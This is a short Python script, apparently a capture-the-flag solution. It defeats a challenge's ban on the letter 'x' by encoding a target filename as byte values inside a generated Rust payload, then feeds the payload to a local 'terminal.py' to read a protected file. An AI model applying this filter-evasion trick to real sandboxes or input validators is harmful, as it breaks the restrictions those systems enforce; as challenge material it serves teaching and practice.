import subprocess
import sys

def solve():
 
    target_file = "death_star_x_plans.txt"
    bytes_list = [ord(c) for c in target_file]
    
    vec_content = ", ".join(str(b) for b in bytes_list)
    

    payload = f"""
    use std::fs;
    
    let f_bytes = vec![{vec_content}];
    let f_name = String::from_utf8(f_bytes).unwrap();
    let content = fs::read_to_string(f_name).unwrap();
    println!("{{}}", content);
    """
    
    if 'x' in payload.lower():
        print(f"FAILED: Payload contains 'x'!\nPayload:\n{payload}")
        return

    print("Generated Payload (No 'x'):")
    print(payload)
    print("-" * 20)

  
    input_str = payload + "\nEND_TRANSMISSION\n"
    
    
    print("Running terminal.py...")
    try:
        result = subprocess.run(
            [sys.executable, "terminal.py"],
            input=input_str,
            capture_output=True,
            text=True,
            timeout=10
        )
        
        print(result.stdout)
        if result.stderr:
            print("STDERR:", result.stderr)
            
    except subprocess.TimeoutExpired:
        print("Timeout running terminal.py")
    except Exception as e:
        print(f"Error running terminal.py: {e}")

if __name__ == "__main__":
    solve()
